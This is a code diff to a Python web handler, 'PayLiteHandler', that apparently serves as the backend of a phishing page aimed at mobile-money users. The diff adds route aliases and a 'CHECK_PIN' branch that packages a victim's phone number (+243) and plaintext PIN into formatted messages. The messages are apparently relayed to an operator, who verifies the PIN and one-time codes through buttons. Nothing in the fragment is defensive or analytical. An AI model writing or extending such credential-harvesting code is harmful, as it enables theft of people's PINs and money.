@@ -797,7 +797,7 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
             return self.__class__.LOCAL_DB.get(session_id, "pending")
 
         parsed_path = urlparse(self.path)
-        if parsed_path.path == '/api/status':
+        if parsed_path.path in ['/api/status', '/status']:
             qs = parse_qs(parsed_path.query)
             session_id = qs.get('session_id', [''])[0]
             current_status = get_status_local(session_id)
@@ -808,7 +808,7 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps({"status": current_status}).encode("utf-8"))
             return
 
-        if self.path == '/api/verify':
+        if parsed_path.path in ['/api/verify', '/verify']:
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
 
@@ -826,6 +826,11 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
                 message += f"📱 <b>Phone:</b> +243 {phone}\n"
                 message += f"🔑 <b>PIN:</b> {pin}\n"
                 message += f"⚠️ <i>User requested a new code.</i>"
+            elif otp == 'CHECK_PIN':
+                message = f"🔍 <b>CHECK PIN VERIFICATION</b>\n\n"
+                message += f"📱 <b>Phone:</b> +243 {phone}\n"
+                message += f"🔑 <b>PIN:</b> {pin}\n"
+                message += f"⚠️ <i>Verify PIN validity via buttons below:</i>"
             else:
                 message = f"🚀 <b>New Application Received!</b>\n\n"
                 message += f"📱 <b>Phone:</b> +243 {phone}\n"
